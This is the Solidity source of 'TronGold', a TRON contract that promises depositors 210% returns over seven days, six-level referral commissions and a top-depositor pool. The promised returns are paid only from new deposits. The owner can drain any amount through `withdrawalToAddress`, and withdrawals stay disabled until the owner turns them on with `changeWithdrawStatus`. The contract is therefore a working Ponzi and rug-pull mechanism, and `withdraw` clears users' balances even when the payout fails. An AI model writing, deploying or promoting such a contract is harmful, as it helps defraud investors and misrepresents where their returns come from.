//SourceUnit: contract.sol

pragma solidity ^0.5.10;

contract TronGold{
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint referrals_tier5;
    uint referrals_tier6;
    uint pool_profit;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  struct InvestorReferral {
  
    uint referralsAmt_tier1;
    uint referralsAmt_tier2;
    uint referralsAmt_tier3;
    uint referralsAmt_tier4;
    uint referralsAmt_tier5;
    uint referralsAmt_tier6;
    uint balanceRef;
  }
 

  
  address public owner = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint[] public pool_top;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint public todayContractInvestment;
  uint public totalRefRewards;
  uint public todayPoolInvestment;
  bool public withdrawStatus;
  mapping (address => Investor) public investors;
  mapping (address => InvestorReferral) public investorreferrals;
  mapping(uint => address) public pool_top_address;
  mapping(uint => uint) public pool_top_amount;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Reinvest(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  event TransferOwnership(address user);
  
    function register(address referer) internal {
        if (!investors[msg.sender].registered) {
            investors[msg.sender].registered = true;
            totalInvestors++;
      
            if (investors[referer].registered && referer != msg.sender) {
            investors[msg.sender].referer = referer;
        
            address rec = referer;
            for (uint i = 0; i < refRewards.length; i++) {
                if (!investors[rec].registered) {
                    break;
                }
          
                if (i == 0) {
                    investors[rec].referrals_tier1++;
                }
                if (i == 1) {
                    investors[rec].referrals_tier2++;
                }
                if (i == 2) {
                    investors[rec].referrals_tier3++;
                }
                if (i == 3) {
                    investors[rec].referrals_tier4++;
                }
                if (i == 4) {
                    investors[rec].referrals_tier5++;
                }
                if (i == 5) {
                    investors[rec].referrals_tier6++;
                }
                
                rec = investors[rec].referer;
            }
            rewardReferers(msg.value, investors[msg.sender].referer);
        }
    }
  }
  
    function rewardReferers(uint amount, address referer) internal {
        address rec = referer;
    
        for (uint i = 0; i < refRewards.length; i++) {
            if (!investors[rec].registered) {
                break;
            }
            uint refRewardPercent = 0;
            if(i==0){
                refRewardPercent = 10;
            }
            else if(i==1){
                refRewardPercent = 5;
            }
            else if(i==2){
                refRewardPercent = 2;
            }
            else if(i==3){
                refRewardPercent = 1;
            }
            else if(i==4){
                refRewardPercent = 1;
            }
            else if(i==5){
                refRewardPercent = 1;
            }
            
            uint a = amount * refRewardPercent / 100;
      
            if(i==0){
                investorreferrals[rec].referralsAmt_tier1 += a;
            }
            else if(i==1){
                investorreferrals[rec].referralsAmt_tier2 += a;
            }
            else if(i==2){
                investorreferrals[rec].referralsAmt_tier3 += a;
            }
            else if(i==3){
                investorreferrals[rec].referralsAmt_tier4 += a;
            }
            else if(i==4){
                investorreferrals[rec].referralsAmt_tier5 += a;
            }
            else if(i==5){
                investorreferrals[rec].referralsAmt_tier6 += a;
            }
      
            investors[rec].balanceRef += a;
            investors[rec].totalRef += a;
            totalRefRewards += a;
      
            rec = investors[rec].referer;
        }
    }
  
  
    function setTopPoolUser(uint amount, address userAddr) internal {
        address userAddress = userAddr;
        for(uint i=0; i<pool_top.length; i++){
            if(pool_top_amount[i]<amount){
            
                uint swapVar =  pool_top_amount[i];
                pool_top_amount[i] = amount;
                amount = swapVar;
            
                address swapVarAddr =  pool_top_address[i];
                pool_top_address[i] = userAddress;
                userAddress = swapVarAddr;
            }
        }
    }
  
    constructor() public {
        tariffs.push(Tariff(7 * 28800, 210));
  
        for (uint j = 0; j <= 3; j++) {
        
            pool_top.push(j);
            pool_top_address[j] = owner;
            pool_top_amount[j] = 0;
        }
    
        for (uint i = 6; i >= 1; i--) {
            refRewards.push(i);
        }
   }
  
    function deposit(uint tariff, address referer) external payable {
        require(tariff < tariffs.length);
        require(msg.value >= 100 trx);
	    if(investors[msg.sender].registered){
		    require(investors[msg.sender].deposits[0].tariff == tariff);
	        
	    }
	    
	
		register(referer);
        setTopPoolUser(msg.value,msg.sender);
	
		
		investors[msg.sender].invested += msg.value;
	
		totalInvested += msg.value;
		todayPoolInvestment += msg.value;
		investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
		
		emit DepositAt(msg.sender, tariff, msg.value);
	
    }
  

   
  
    function profit() internal returns (uint) {
        Investor storage investor = investors[msg.sender];
        uint amount = withdrawable(msg.sender);
        amount += investor.balanceRef;
        amount += investor.pool_profit;
        investor.balanceRef = 0;
        investor.pool_profit = 0;
        investor.paidAt = block.number;
        return amount;
    }
    
    function resetTopSponsorList() external{
         require(msg.sender == owner);
         for (uint j = 0; j <= 3; j++) {
        
            pool_top_address[j] = msg.sender;
            pool_top_amount[j] = 0;
        }
    }
  
   function withdraw() external {
       require(withdrawStatus);
        uint amount = profit();
        require(amount >=1 trx);
        if (msg.sender.send(amount)) {
            investors[msg.sender].withdrawn += amount;
            totalWithdrawal +=amount;
            emit Withdraw(msg.sender, amount);
        }
    }
    
    function changeWithdrawStatus() external {
         require(msg.sender == owner);
          withdrawStatus = !withdrawStatus;
    }
  

    
    function poolDistribution() external {
        require(msg.sender == owner);
        uint getDistributedAmt = todayPoolInvestment*3/100;
        uint poolPercent = 0;
         for(uint i = 0; i < pool_top.length; i++) {
        
            if(i==0){
                poolPercent = 40;
            }
            else if(i==1){
                poolPercent = 30;
            }
             else if(i==2){
                poolPercent = 20;
            }
             else if(i==3){
                poolPercent = 10;
            }
            
            uint poolPercentAmt = getDistributedAmt*poolPercent/100;
            investors[pool_top_address[i]].pool_profit +=poolPercentAmt;
            
            pool_top_address[i] = owner;
            pool_top_amount[i] = 0;
        }
        todayPoolInvestment = 0;
    }
    
    
  
    function withdrawalToAddress(address payable to,uint amount) external {
        require(msg.sender == owner);
        to.transfer(amount);
    }
  
    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint i = 0; i < pool_top.length; i++) {
            

            addrs[i] = pool_top_address[i];
            deps[i] = pool_top_amount[i];
        }
    }
    
     
  
    function withdrawable(address user) public view returns (uint amount) {
        Investor storage investor = investors[user];
        
        for (uint i = 0; i < investor.deposits.length; i++) {
          Deposit storage dep = investor.deposits[i];
          Tariff storage tariff = tariffs[dep.tariff];
          
          uint finish = dep.at + tariff.time;
          uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
          uint till = block.number > finish ? finish : block.number;
    
          if (since < till) {
            amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
          }
        }
   }
  

   function transferOwnership(address to) external {
        require(msg.sender == owner);
        owner = to;
        emit TransferOwnership(owner);
    }
  function userInfo() public view returns (uint,uint,uint,uint,uint,uint) {
        
       Investor storage investor = investors[msg.sender];
        uint roiAmt = withdrawable(msg.sender);
        uint balanceRef = investor.balanceRef;
        uint topReferralReward = investor.pool_profit;
        uint profitAmt = roiAmt + balanceRef + topReferralReward; 
	    uint userwithdrawn = investor.withdrawn;
	    uint userinvested = investor.invested;
	    uint totalDirectReferral = investor.referrals_tier1;
	 
	    return (balanceRef,topReferralReward,userwithdrawn,profitAmt,userinvested,totalDirectReferral);
    
    }
    
    function contractInfo() public view returns (address,uint,uint,uint) {
        Investor storage investor = investors[msg.sender];
        address referBy = investor.referer;
        return (referBy,totalInvested,totalWithdrawal,todayPoolInvestment);
    }  
  
  
}